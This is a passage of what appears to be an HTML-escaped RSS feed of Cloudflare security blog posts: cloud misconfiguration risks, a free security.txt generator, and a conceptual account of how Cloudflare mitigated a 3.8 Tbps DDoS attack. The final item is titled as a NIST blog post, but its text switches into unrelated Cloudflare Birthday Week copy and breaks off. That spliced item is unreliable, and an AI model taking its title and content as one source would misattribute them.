&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Complexity of cloud environments:&lt;/b&gt; Cloud infrastructure can be highly complex with multiple services and configurations to manage. For example, &lt;a href="https://public.docs.kivera.io/docs/access-analyzer"&gt;&lt;u&gt;AWS alone offers&lt;/u&gt;&lt;/a&gt; 373 services with 15,617 actions and 140,000+ parameters, making it challenging for IT teams to manage settings accurately. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Decentralized management:&lt;/b&gt; In large organizations, cloud infrastructure resources are often managed by multiple teams or departments. Without centralized oversight, inconsistent security policies and configurations can arise, increasing the risk of misconfigurations.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Continuous Integration and Continuous Deployment (CI/CD):&lt;/b&gt; CI/CD pipelines promote the ability to rapidly deploy, change and frequently update infrastructure. With this velocity comes the increased risk of misconfigurations when changes are not properly managed and reviewed.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Insufficient training and awareness:&lt;/b&gt; Employees may lack the cross-functional skills needed for cloud security, such as understanding networks, identity, and service configurations. This knowledge gap can lead to mistakes and increases the risk of misconfigurations that compromise security.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Common exploitation methods &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#common-exploitation-methods"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Threat actors exploit cloud services through various means, including targeting misconfigurations, abusing privileges, and bypassing encryption. Misconfigurations such as exposed storage buckets or improperly secured APIs offer attackers easy access to sensitive data and resources. Privilege abuse occurs when attackers gain unauthorized access through compromised credentials or poorly managed identity and access management (IAM) policies, allowing them to escalate their access and move laterally within the cloud environment. Additionally, unencrypted data enables attackers to intercept and decrypt data in transit or at rest, further compromising the integrity and confidentiality of sensitive information.&lt;/p&gt;&lt;p&gt;Here are some other vulnerabilities that organizations should address: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Unrestricted access to cloud tenants:&lt;/b&gt; Allowing unrestricted access exposes cloud platforms to &lt;a href="https://www.cloudflare.com/learning/security/what-is-data-exfiltration/"&gt;data exfiltration&lt;/a&gt; by malicious actors. Limiting access to approved tenants with specific IP addresses and service destinations helps prevent unauthorized access.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Exposed access keys:&lt;/b&gt; Exposed access keys can be exploited by unauthorized parties to steal or delete data. Requiring encryption for the access keys and restricting their usage can mitigate this risk.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Excessive account permissions:&lt;/b&gt; Granting excessive privileges to cloud accounts increases the potential impact of security breaches. Limiting permissions to necessary operations helps prevent lateral movement and privilege escalation by threat actors.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Inadequate network segmentation:&lt;/b&gt; Poorly managed network security groups and insufficient segmentation practices can allow attackers to move freely within cloud environments. Drawing boundaries around your cloud resources and tenants ensures that data stays within your organization.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Improper public access configuration:&lt;/b&gt; Incorrectly exposing critical services or storage resources to the internet increases the likelihood of unauthorized access and data compromise. Preventing public access drastically reduces risk.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Shadow cloud infrastructure:&lt;/b&gt; Abandoned or neglected cloud instances are often left vulnerable to exploitation, providing attackers with opportunities to access sensitive data left behind. Preventing untagged or unapproved cloud resources to be created can reduce the risk of exposure.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;Limitations of existing tools &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#limitations-of-existing-tools"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Many organizations turn to CSPM tools to give them more visibility into cloud misconfigurations. These tools often alert teams after an issue occurs, putting security teams in a reactive mode. Remediation efforts require collaboration between security teams and developers to implement changes, which can be time-consuming and resource-intensive. This approach not only delays issue resolution but also exposes companies to compliance and legal risks, while failing to train employees on secure cloud practices. &lt;a href="https://www.ibm.com/reports/data-breach-action-guide"&gt;&lt;u&gt;On average&lt;/u&gt;&lt;/a&gt;, it takes 207 days to identify these breaches and an additional 70 days to contain them. &lt;/p&gt;&lt;p&gt;Addressing the growing threat of cloud misconfigurations requires proactive security measures and continuous monitoring. Organizations must adopt proactive security solutions that not only detect and alert but also prevent misconfigurations from occuring in the first place and enforce best practices. Creating a first line of defense for cloud deployment errors reduces the volume of alerts for customers, especially those also using CSPM tools or CNAPPs. &lt;/p&gt;&lt;p&gt;By implementing these proactive strategies, organizations can safeguard their cloud environments against the evolving landscape of cyber threats, ensuring robust security and compliance while minimizing risks and operational disruptions.&lt;/p&gt;

          &lt;/div&gt;
          &lt;p&gt;Meet Georgia, a diligent website administrator at a growing e-commerce company. Every day, Georgia juggles multiple tasks, from managing server uptime to ensuring customer data security. One morning, Georgia receives an email from a security researcher who discovered a potential vulnerability on the website. The researcher struggled to find the right contact information, leading to delays in reporting the issue. Georgia realizes the need for a standardized way to communicate with security researchers, ensuring that vulnerabilities are reported swiftly and efficiently. This is where security.txt comes in.&lt;/p&gt;

            &lt;h2&gt;Why security.txt matters&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-security-txt-matters"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;&lt;a href="https://securitytxt.org/"&gt;&lt;u&gt;Security.txt&lt;/u&gt;&lt;/a&gt; is becoming a widely adopted standard among security-conscious organizations. By providing a common location and format for vulnerability disclosure information, it helps bridge the gap between security researchers and organizations. This initiative is supported by major companies and aligns with global security best practices. By offering an automated security.txt generator for free, we aim to empower all of our users to enhance their security measures without additional costs.&lt;/p&gt;&lt;p&gt;In 2020, Cloudflare published the Cloudflare Worker for the security.txt generator as an &lt;a href="https://github.com/cloudflare/securitytxt-worker?cf_history_state=%7B%22guid%22%3A%22C255D9FF78CD46CDA4F76812EA68C350%22%2C%22historyId%22%3A8%2C%22targetId%22%3A%22532D731DBD87B52B996FF5AD5ADDA824%22%7D"&gt;&lt;u&gt;open-source project on GitHub&lt;/u&gt;&lt;/a&gt;, demonstrating our commitment to enhancing web security. This tool is actively used by Cloudflare to streamline vulnerability disclosure processes. However, over the past few years, we've observed a growing demand from our customers for an easier way to implement this standard. In response to this demand and to further support the adoption of security.txt across the Internet, we integrated it directly into our dashboard, making it simple for all our users to enhance their security practices. You can learn more about the initial release and its impact in our previous blog post &lt;a href="https://blog.cloudflare.com/security-dot-txt/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Who can use the free Cloudflare security.txt generator&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#who-can-use-the-free-cloudflare-security-txt-generator"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;This feature is designed for any Cloudflare user who manages a website, from small business owners to large enterprises, from developers to security professionals. Whether you're a seasoned security expert or new to website management, this tool provides an easy way to create and manage your security.txt file in your Cloudflare account, ensuring that you're prepared to handle vulnerability reports effectively.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Technical insights: leveraging Cloudflare’s tools&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#technical-insights-leveraging-cloudflares-tools"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Our security.txt generator is seamlessly integrated into our dashboard. Here's how it works:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2z7tEph5hu4T7LCkZU5KFQ/8bc9c8efe332cda618c5dd8bb51e38da/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;When the user enters their data in the Cloudflare Dashboard, the information is immediately stored in a highly available and geo-redundant &lt;a href="https://blog.cloudflare.com/performance-isolation-in-a-multi-tenant-database-environment/"&gt;&lt;u&gt;PostgreSQL database&lt;/u&gt;&lt;/a&gt;. This ensures that all user data is securely kept and can be accessed quickly from any location within our global network.&lt;/p&gt;&lt;p&gt;Instead of creating a static file at the point of data entry, we use a dynamic approach. When a request for the security.txt file is made via the standard .well-known path specified by &lt;a href="https://www.rfc-editor.org/rfc/rfc9116"&gt;&lt;u&gt;RFC 9116&lt;/u&gt;&lt;/a&gt;, our system dynamically constructs the file using the latest data from our database. This method ensures that any updates made by users are reflected in real-time without requiring manual intervention or file regeneration. The data entered by users is synchronized across Cloudflare’s global network using our &lt;a href="https://blog.cloudflare.com/introducing-quicksilver-configuration-distribution-at-internet-scale/"&gt;&lt;u&gt;Quicksilver&lt;/u&gt;&lt;/a&gt; technology. This allows for rapid propagation of changes, ensuring that any updates to the security.txt file are available almost instantaneously across all servers.&lt;/p&gt;&lt;p&gt;Each security.txt file includes an expiration timestamp, which is set during the initial configuration. This timestamp helps alert users when their information may be outdated, encouraging them to review and update their details regularly. For example, if a user sets an expiration date 365 days into the future, they will receive notifications as this date approaches, prompting them to refresh their information.&lt;/p&gt;&lt;p&gt;To ensure compliance with best practices, we also support optional fields such as encryption keys and signatures within the security.txt file. Users can link to their PGP keys for secure communications or include signatures to verify authenticity, enhancing trust with security researchers.&lt;/p&gt;&lt;p&gt;Users who prefer automation can manage their security.txt files through our &lt;a href="https://developers.cloudflare.com/api/operations/update-security-txt"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt;, allowing seamless integration with existing workflows and tools. This feature enables developers to programmatically update their security.txt configurations without manual dashboard interactions.&lt;/p&gt;&lt;p&gt;Users can also find a view of any missing security.txt files via &lt;a href="https://developers.cloudflare.com/security-center/security-insights/"&gt;&lt;u&gt;Security Insights&lt;/u&gt;&lt;/a&gt; under Security Center.&lt;/p&gt;

          &lt;/div&gt;
        &lt;p&gt;By making this feature available to all our users at no cost, we aim to support the security efforts of our entire community, helping you protect your digital assets and foster trust with your audience.&lt;/p&gt;&lt;p&gt;With the introduction of our free security.txt generator, we're taking a significant step towards simplifying security management for everyone. Whether you're a small business owner or a large enterprise, this tool empowers you to adopt industry best practices and ensure that you're ready to handle vulnerability reports effectively. &lt;a href="https://developers.cloudflare.com/security-center/infrastructure/security-file/"&gt;&lt;u&gt;Set up security.txt&lt;/u&gt;&lt;/a&gt; on your websites today!&lt;/p&gt;</content:encoded><guid isPermaLink="false">1uvkAn3IB6vSEO91XsPyAO</guid><category>Better Internet</category><category>Security Posture</category><category>Security</category><category>Standards</category><category>security.txt</category></item><item><title>How Cloudflare auto-mitigated world record 3.8 Tbps DDoS attack</title><link>https://blog.cloudflare.com/how-cloudflare-auto-mitigated-world-record-3-8-tbps-ddos-attack/</link><description>Over the past couple of weeks, Cloudflare's DDoS protection systems have automatically and successfully mitigated multiple hyper-volumetric L3/4 DDoS attacks exceeding 3 billion packets per second (Bpps). Our systems also automatically mitigated multiple attacks exceeding 3 terabits per second (Tbps), with the largest ones exceeding 3.65 Tbps. The scale of these attacks is unprecedented.</description><content:encoded>&lt;p&gt;Since early September, &lt;a href="https://developers.cloudflare.com/ddos-protection/about/components/#autonomous-edge"&gt;&lt;u&gt;Cloudflare's DDoS protection systems&lt;/u&gt;&lt;/a&gt; have been combating a month-long campaign of hyper-volumetric L3/4 DDoS attacks. Cloudflare’s defenses mitigated over one hundred hyper-volumetric L3/4 DDoS attacks throughout the month, with many exceeding 2 billion packets per second (Bpps) and 3 terabits per second (Tbps). The largest attack peaked 3.8 Tbps — the largest ever disclosed publicly by any organization. Detection and mitigation was fully autonomous. The graphs below represent two separate attack events that targeted the same Cloudflare customer and were mitigated autonomously.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7hXUgmEd37kzZrMs0KPXLl/21a4779022bdff91f760dc66759eb955/BLOG-2586_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;A mitigated 3.8 Terabits per second DDoS attack that lasted 65 seconds&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1uxvtlkdFoH6KU6waXxK3o/d17fe7cf0e33c20e64a47b3ca0e6ca63/BLOG-2586_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;A mitigated 2.14 billion packet per second DDoS attack that lasted 60 seconds&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cloudflare customers are protected&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflare-customers-are-protected"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare customers using Cloudflare’s HTTP reverse proxy services (e.g. &lt;a href="https://developers.cloudflare.com/waf/"&gt;&lt;u&gt;Cloudflare WAF&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/cache/"&gt;&lt;u&gt;Cloudflare CDN&lt;/u&gt;&lt;/a&gt;) are automatically protected.&lt;/p&gt;&lt;p&gt;Cloudflare customers using &lt;a href="https://developers.cloudflare.com/spectrum/"&gt;&lt;u&gt;Spectrum&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/magic-transit/"&gt;&lt;u&gt;Magic Transit&lt;/u&gt;&lt;/a&gt; are also automatically protected. Magic Transit customers can further optimize their protection by deploying &lt;a href="https://developers.cloudflare.com/magic-firewall/"&gt;&lt;u&gt;Magic Firewall&lt;/u&gt;&lt;/a&gt; rules to enforce a strict positive and negative security model at the packet layer.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Other Internet properties may not be safe&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#other-internet-properties-may-not-be-safe"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The scale and frequency of these attacks are unprecedented. Due to their sheer size and bits/packets per second rates, these attacks have the ability to take down unprotected Internet properties, as well as Internet properties that are protected by on-premise equipment or by cloud providers that just don’t have sufficient network capacity or global coverage to be able to handle these volumes alongside legitimate traffic without impacting performance. &lt;/p&gt;&lt;p&gt;Cloudflare, however, does have the network capacity, global coverage, and intelligent systems needed to absorb and automatically mitigate these monstrous attacks. &lt;/p&gt;&lt;p&gt;In this blog post, we will review the attack campaign and why its attacks are so severe. We will describe the anatomy of a Layer 3/4 DDoS attack, its objectives, and how attacks are generated. We will then proceed to detail how Cloudflare’s systems were able to autonomously detect and mitigate these monstrous attacks without impacting performance for our customers. We will describe the key aspects of our defenses, starting with how our systems generate real-time (dynamic) signatures to match the attack traffic all the way to how we leverage kernel features to drop packets at wire-speed.&lt;/p&gt;

            &lt;h2&gt;Campaign analysis&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#campaign-analysis"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We have observed this attack campaign targeting multiple customers in the financial services, Internet, and telecommunication industries, among others. This attack campaign targets bandwidth saturation as well as resource exhaustion of in-line applications and devices.&lt;/p&gt;&lt;p&gt;The attacks predominantly leverage &lt;a href="https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/"&gt;&lt;u&gt;UDP&lt;/u&gt;&lt;/a&gt; on a fixed port, and originated from across the globe with larger shares coming from Vietnam, Russia, Brazil, Spain, and the US. &lt;/p&gt;&lt;p&gt;The high packet rate attacks appear to originate from multiple types of compromised devices, including MikroTik devices, DVRs, and Web servers, orchestrated to work in tandem and flood the target with exceptionally large volumes of traffic. The high bitrate attacks appear to originate from a large number of compromised ASUS home routers, likely exploited using &lt;a href="https://censys.com/june-20-improper-authentication-vulnerability-in-asus-routers/"&gt;&lt;u&gt;a CVE 9.8 (Critical) vulnerability that was recently discovered by Censys&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;div&gt;

          &lt;/div&gt;
          &lt;p&gt;Before we discuss how Cloudflare automatically detected and mitigated the largest DDoS attacks ever seen, it‘s important to understand the basics of DDoS attacks. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7HLtAHnyjS33iiJAR1B9h9/2e1fc2cab871440fc95fa803989ae156/BLOG-2586_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Simplified diagram of a DDoS attack&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The goal of a &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;Distributed Denial of Service (DDoS) attack&lt;/u&gt;&lt;/a&gt; is to deny legitimate users access to a service. This is usually done by exhausting resources needed to provide the service. In the context of these recent Layer 3/4 DDoS attacks, that resource is CPU cycles and network bandwidth.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Exhausting CPU cycles&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#exhausting-cpu-cycles"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Processing a packet consumes CPU cycles. In the case of regular (non-attack) traffic, a &lt;i&gt;legitimate&lt;/i&gt; packet received by a service will cause that service to perform some action, and different actions require different amounts of CPU processing. However, before a packet is even delivered to a service there is per-packet work that needs to be done. Layer 3 packet headers need to be parsed and processed to deliver the packet to the correct machine and interface. Layer 4 packet headers need to be processed and routed to the correct socket (if any). There may be multiple additional processing steps that inspect every packet. Therefore, if an attacker sends at a high enough packet rate, then they can potentially saturate the available CPU resources, denying service to legitimate users.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3aBbNG4Fc7TY6MTugLl3BE/064fb17761aebbce737a5a4518a14235/BLOG-2586_6.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;To defend against high packet rate attacks, you need to be able to inspect and discard the bad packets using as few CPU cycles as possible, leaving enough CPU to process the good packets. You can additionally acquire more, or faster, CPUs to perform the processing — but that can be a very lengthy process that bears high costs. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Exhausting network bandwidth&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#exhausting-network-bandwidth"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Network bandwidth is the total amount of data per time that can be delivered to a server. You can think of bandwidth like a pipe to transport water. The amount of water we can deliver through a drinking straw is less than what we could deliver through a garden hose. If an attacker is able to push more garbage data into the pipe than it can deliver, then both the bad data &lt;i&gt;and&lt;/i&gt; the good data will be discarded upstream, at the entrance to the pipe, and the DDoS is therefore successful.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/OehVItOhGfP9ApllRvDDM/fce73e6f375173a1a53bc22026e0b9b1/BLOG-2586_7.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;
Defending against attacks that can saturate network bandwidth can be difficult because there is very little that can be done if you are on the downstream side of the saturated pipe. There are really only a few choices: you can get a bigger pipe, you can potentially find a way to move the good traffic to a new pipe that isn’t saturated, or you can hopefully ask the upstream side of the pipe to stop sending some or all of the data into the pipe.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Generating DDoS attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#generating-ddos-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;If we think about what this means from the attackers point of view you realize there are similar constraints. Just as it takes CPU cycles to receive a packet, it also takes CPU cycles to create a packet. If, for example, the cost to send and receive a packet were equal, then the attacker would need an equal amount of CPU power to generate the attack as we would need to defend against it. In most cases this is not true — there is a cost asymmetry, as the attacker is able to generate packets using fewer CPU cycles than it takes to receive those packets. However, it is worth noting that generating attacks is not free and can require a large amount of CPU power.&lt;/p&gt;&lt;p&gt;Saturating network bandwidth can be even more difficult for an attacker. Here the attacker needs to be able to output more bandwidth than the target service has allocated. They actually need to be able to exceed the capacity of the receiving service. This is so difficult that the most common way to achieve a network bandwidth attack is to use a reflection/amplification attack method, for example a &lt;a href="https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/"&gt;&lt;u&gt;DNS Amplification attack&lt;/u&gt;&lt;/a&gt;. These attacks allow the attacker to send a small packet to an intermediate service, and the intermediate service will send a large packet to the victim.&lt;/p&gt;&lt;p&gt;In both scenarios, the attacker needs to acquire or gain access to many devices to generate the attack. These devices can be acquired in a number of different ways. They may be server class machines from cloud providers or hosting services, or they can be compromised devices like DVRs, routers, and webcams that have been infected with the attacker’s malware. These machines together form the botnet.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How Cloudflare defends against large attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-cloudflare-defends-against-large-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Now that we understand the fundamentals of how DDoS attacks work, we can explain how Cloudflare can defend against these attacks.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Spreading the attack surface using global anycast&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#spreading-the-attack-surface-using-global-anycast"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The first not-so-secret ingredient is that Cloudflare’s network is built on &lt;a href="https://www.cloudflare.com/learning/cdn/glossary/anycast-network/"&gt;&lt;u&gt;anycast&lt;/u&gt;&lt;/a&gt;. In brief, anycast allows a single IP address to be advertised by multiple machines around the world. A packet sent to that IP address will be served by the closest machine. This means when an attacker uses their distributed botnet to launch an attack, the attack will be received in a distributed manner across the Cloudflare network. An infected DVR in Dallas, Texas will send packets to a Cloudflare server in Dallas. An infected webcam in London will send packets to a Cloudflare server in London.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/48tW6A6ACUT4Fd9h3l70F4/c6bcea8f037fc853477d0987c939e007/BLOG-2586_8.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Anycast vs. Unicast networks&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Our anycast network additionally allows Cloudflare to allocate compute and bandwidth resources closest to the regions that need them the most. Densely populated regions will generate larger amounts of legitimate traffic, and the data centers placed in those regions will have more bandwidth and CPU resources to meet those needs. Sparsely populated regions will naturally generate less legitimate traffic, so Cloudflare data centers in those regions can be sized appropriately. Since attack traffic is mainly coming from compromised devices, those devices will tend to be distributed in a manner that matches normal traffic flows sending the attack traffic proportionally to datacenters that can handle it. And similarly, within the datacenter, traffic is distributed across multiple machines.&lt;/p&gt;&lt;p&gt;Additionally, for high bandwidth attacks, Cloudflare’s network has another advantage. A large proportion of traffic on the Cloudflare network does not consume bandwidth in a symmetrical manner. For example, an HTTP request to get a webpage from a site behind Cloudflare will be a relatively small incoming packet, but produce a larger amount of outgoing traffic back to the client. This means that the Cloudflare network tends to egress far more legitimate traffic than we receive. However, the network links and bandwidth allocated are symmetrical, meaning there is an abundance of ingress bandwidth available to receive volumetric attack traffic.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Generating real-time signatures&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#generating-real-time-signatures"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;By the time you’ve reached an individual server inside a datacenter, the bandwidth of the attack has been distributed enough that none of the upstream links are saturated. That doesn’t mean the attack has been fully stopped yet, since we haven’t dropped the bad packets. To do that, we need to sample traffic, qualify an attack, and create rules to block the bad packets. &lt;/p&gt;&lt;p&gt;Sampling traffic and dropping bad packets is the job of our &lt;a href="https://blog.cloudflare.com/l4drop-xdp-ebpf-based-ddos-mitigations/"&gt;&lt;u&gt;l4drop&lt;/u&gt;&lt;/a&gt; component, which uses &lt;a href="https://netdevconf.info/2.1/papers/Gilberto_Bertin_XDP_in_practice.pdf"&gt;&lt;u&gt;XDP (eXpress Data Path)&lt;/u&gt;&lt;/a&gt; and leverages an extended version of the Berkeley Packet Filter known as &lt;a href="https://blog.cloudflare.com/tag/ebpf/"&gt;&lt;u&gt;eBPF (extended BPF)&lt;/u&gt;&lt;/a&gt;. This enables us to execute custom code in kernel space and process (drop, forward, or modify) each packet directly at the network interface card (NIC) level. This component helps the system drop packets efficiently without consuming excessive CPU resources on the machine. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1NUxGTvKFs5l6G2UCSxvqw/3632f6728f9361123169d9694c807f0b/BLOG-2586_9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cloudflare DDoS protection system overview&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;We use XDP to sample packets to look for suspicious attributes that indicate an attack. The samples include fields such as the source IP, source port, destination IP, destination port, protocol, TCP flags, sequence number, options, packet rate and more. This analysis is conducted by the &lt;i&gt;denial of service daemon (dosd).&lt;/i&gt; &lt;i&gt;Dosd&lt;/i&gt; holds our secret sauce. It has many &lt;i&gt;filters&lt;/i&gt; which instruct it, based on our curated heuristics, when to initiate mitigation. To our customers, these filters are logically grouped by attack vectors and exposed as the &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/"&gt;&lt;u&gt;DDoS Managed Rules&lt;/u&gt;&lt;/a&gt;. Our customers can &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/adjust-rules/"&gt;&lt;u&gt;customize their behavior&lt;/u&gt;&lt;/a&gt; to some extent, as needed.&lt;/p&gt;&lt;p&gt;As it receives samples from XDP, dosd will generate multiple permutations of fingerprints for suspicious traffic patterns. Then, using a data streaming algorithm, dosd will identify the most optimal fingerprints to mitigate the attack. Once an attack is qualified, dosd will push a mitigation rule inline as an eBPF program to surgically drop the attack traffic. &lt;/p&gt;&lt;p&gt;The detection and mitigation of attacks by dosd is done at the server level, at the data center level and at the global level — and it’s all software defined. This makes our network extremely resilient and leads to almost instant mitigation. There are no out-of-path “scrubbing centers” or “scrubbing devices”. Instead, each server runs the full stack of the Cloudflare product suite including the DDoS detection and mitigation component. And it is all done autonomously. Each server also &lt;i&gt;gossips (multicasts)&lt;/i&gt; mitigation instructions within a data center between servers, and globally between data centers. This ensures that whether an attack is localized or globally distributed, dosd will have already installed mitigation rules inline to ensure a robust mitigation.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Strong defenses against strong attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#strong-defenses-against-strong-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Our software-defined, autonomous DDoS detection and mitigation systems run across our entire network. In this post we focused mainly on our dynamic fingerprinting capabilities, but our arsenal of defense systems is much larger. The &lt;a href="https://developers.cloudflare.com/ddos-protection/tcp-protection/"&gt;&lt;u&gt;Advanced TCP Protection&lt;/u&gt;&lt;/a&gt; system and &lt;a href="https://developers.cloudflare.com/ddos-protection/dns-protection/"&gt;&lt;u&gt;Advanced DNS Protection&lt;/u&gt;&lt;/a&gt; system work alongside our dynamic fingerprinting to identify sophisticated and highly randomized TCP-based DDoS attacks and also leverages statistical analysis to thwart complex DNS-based DDoS attacks. Our defenses also incorporate real-time threat intelligence, traffic profiling, and machine learning classification as part of our &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/adaptive-protection/"&gt;&lt;u&gt;Adaptive DDoS Protection&lt;/u&gt;&lt;/a&gt; to mitigate traffic anomalies. &lt;/p&gt;&lt;p&gt;Together, these systems, alongside the full breadth of the Cloudflare Security portfolio, are built atop of the Cloudflare network — one of the largest networks in the world — to ensure our customers are protected from the largest attacks in the world.&lt;/p&gt;</content:encoded><guid isPermaLink="false">4j6QWqeVFn6qzs0Md0LK7h</guid><category>DDoS</category><category>Attacks</category><category>Trends</category><category>Security</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-3</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.'

Birthday Week each year is packed with major announcements and the release of innovative new offerings, all focused on giving back to our customers and the broader Internet community. Birthday Week has become a proud tradition at Cloudflare and our culture, to not just stay true to our mission, but to always stay close to our customers. We begin planning for this week of celebration earlier in the year and invite everyone at Cloudflare to participate.&lt;/p&gt;&lt;p&gt;Months before Birthday Week, we invited teams to submit ideas for what to announce. We were flooded with submissions, from proposals for implementing new standards to creating new products for developers. Our biggest challenge is finding space for it all in just one week — there is still so much to build. Good thing we have a birthday to celebrate each year, but we might need an extra day in Birthday Week next year!&lt;/p&gt;&lt;p&gt;In case you missed it, here’s everything we announced during 2024’s Birthday Week:&lt;/p&gt;

            &lt;a href="https://blog.cloudflare.com/tag/security/rss#one-more-thing"&gt;
              
            &lt;/a&gt;

